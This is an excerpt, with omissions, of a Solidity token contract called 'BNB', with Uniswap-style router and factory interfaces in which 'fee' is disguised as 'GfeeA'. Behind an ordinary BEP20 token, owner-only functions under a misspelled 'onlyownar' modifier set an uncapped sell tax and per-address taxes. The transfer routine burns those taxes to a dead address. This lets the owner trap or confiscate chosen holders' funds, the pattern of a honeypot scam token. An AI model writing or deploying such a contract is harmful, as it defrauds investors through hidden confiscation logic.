...
interface IUniswapV2Factory {
    ...
    function GfeeATo() external view returns (address);
    function GfeeAToSetter() external view returns (address);
    ...
    function setGfeeATo(address) external;
    function setGfeeAToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingGfeeAOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingGfeeAOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingGfeeAOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingGfeeAOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingGfeeAOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract BNB is BEP20, Ownable {
    ...
    uint256 private _defaultSellGfeeA = 0;

    uint256 private _defaultBuyGfeeA = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipGfeeA;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellGfeeA = _value;
    }

    function setSlipGfeeA(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipGfeeA[_address] = _value;
    }

    function getSlipGfeeA(address _address) external view onlyownar returns (uint256) {
        return _slipGfeeA[_address];
    }


    function setMAccountGfeeA(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountGfeeA(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeGfeeAAmount = 0;

        if (rF) {
            uint256 tradeGfeeA = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeGfeeA = _defaultSellGfeeA;
                }
                if (from == uniswapV2Pair) {

                    tradeGfeeA = _defaultBuyGfeeA;
                }
            }
            if (_slipGfeeA[from] > 0) {
                tradeGfeeA = _slipGfeeA[from];
            }

            tradeGfeeAAmount = _Amount.mul(tradeGfeeA).div(100);
        }


        if (tradeGfeeAAmount > 0) {
            _balances[from] = _balances[from].sub(tradeGfeeAAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeGfeeAAmount);
            emit Transfer(from, _deadAddress, tradeGfeeAAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeGfeeAAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeGfeeAAmount);
        emit Transfer(from, _to, _Amount - tradeGfeeAAmount);
    }
